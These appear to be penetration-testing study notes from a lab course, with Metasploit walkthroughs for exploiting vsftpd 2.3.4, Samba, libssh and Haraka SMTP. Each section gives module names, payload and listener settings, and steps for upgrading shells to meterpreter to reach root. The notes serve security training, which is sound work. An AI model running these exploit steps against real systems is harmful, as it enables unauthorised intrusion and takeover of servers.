
### Exploiting a vulnerable FTP server 

- port 21 - facilitate file sharing between server and clients 
- transfer files to and from the directory of a web server 
- vsftpd is an FTP server for Unix-like systems including Linux systems and the default FTP server for ubuntu, CentOS and Fedora 
- **vsftpd** V2.3.4 is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download archive through supply chain attack.

1) `service` `PostgreSQL` `start` 
2) `msfconsole` 
3) create new `workspace` 
4) set global variable for `rhosts` (setg)
5) perform service detection, operating detection and syn scan: `db_nmap -sS -sV -O ip `
6) `search vsftpd `
7) `use exploit/unix/ftp/vsftpd_234_backdoor `
	(try: )1) `set payload cmd/unix/interact` 
8) open bash terminal on target system: ` /bin/bash -i ` which will open a shell on target to upgrade the shell go to the next step 
9) upgrade session to meterpreter session (put other session in background)
	1) `search shell_to_meterpreter` (will upgrade current shell session to meterpreter session)
	2) `use post/multi/manage/shell_to_meterprete`r (this is a post module so you can only use it when you have an active session on the target system) -> specify options (`set` `session` to `1` (this is the session that we want to upgrade))
	3) `sessions` 
![[Pasted image 20230827153708.png]] 
When userid is 0 then you are root user 


### Exploiting Samba 

- Samba is linux implementation of SMB and allows windows systems to access linux shares and devices 
- uses 445 (TCP) or NetBIOS 139 
- Samba V3.5.0 is vulnerable to a remote code execution vulnerability, allowing a malicious client to upload a shared library to a writeable share, and then cause the server to load and execute it. 
	- Shared library is linux equivalent of a DLL file (libraries called upon by services)

1) `service` `PostgreSQL` `start` 
2) `msfconsole` 
3) create new `workspace` 
4) set global variable for `rhosts` (setg)
5) `db_nmap -sS -sV -O ip`
6) `search type:exploit name:samba`
7) `use exploit/linux/samba/is_known_pipename`
8) run the check command to check if target is vulnerable: `check`
9) `run` 
10) `pwd` (print current working directory) -> put this session in the background so we can work on upgrading to a meterpreter session because it will give us more access
11) `use post/multi/manage/shell_to_meterpreter `
	1) set lhost to kali linux instance 
	2) leave default port 
	3) set the session you want to upgrade (command shell session --> meterpreter session)
	4) when `uid` is zero you have highest privileges' 


### Exploiting Vulnerable SSH server 

- SSH (secure Shell) remote administration protocol that offers encryption 
- used for remote access to servers and systems 
- SSH uses port 22 (or other ports)
- libssh is multiplatform C library implementing the SSHv2 protocol on client and server side 
- libssh V0.6.0-0.8.0 is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server 


1) `service` `PostgreSQL` `start` 
2) `msfconsole` 
3) create new `workspace` 
4) set global variable for `rhosts` (setg)
5) `db_nmap -sS -sV -O ip`
6) check if system is vulnerable: `search libssh_auth_bypass `
7) `use aux/scanner/shh/libssh_auth_bypass `
	1) `set Spawn_PTY true`  
8) ` session 1` ---> `whoami`
9) `whoami` 
10) `cat /etc/\*\release`
11) get kernel version `uname -r`
12) upgrade shell session into meterpreter session - put current session in background: 
	1) `use post/multi/manage/shell_to_meterpreter `
	1) set lhost to kali linux instance 
	2) leave default port 
	3) set the session you want to upgrade (command shell session --> meterpreter session)
	4) when `uid` is zero you have highest privileges' 







### Exploiting Vulnerable SMTP server 

- Simple Mail Transfer protocol is communication protocol that is used for transmission of email 
- uses port 25 by default or 465 and 587 
- Haraka is an opensource high performance SMTP server developed in Node.js 
- The Haraka SMTP server comes with a plugin for processing attachments. Haraka version prior to V2.8.9 are vulnerable to command injection 

1) `service` `PostgreSQL` `start` 
2) `msfconsole` 
3) create new `workspace` 
4) set global variable for `rhosts` (setg)
5) `db_nmap -sS -sV -O ip`
6) `use  exploit/linux/smtp/haraka `
	1) `set srvport 9898`  (we need port 8080 as our lport so we need to change it)
	2) `set email_to root@attackdefense.test `
	3) `set payload linux.x64/meterpreter_reverse_http ` (stageless payload)
	4) `options` 
	5) `set lhost eth1 `
	6) `run` 
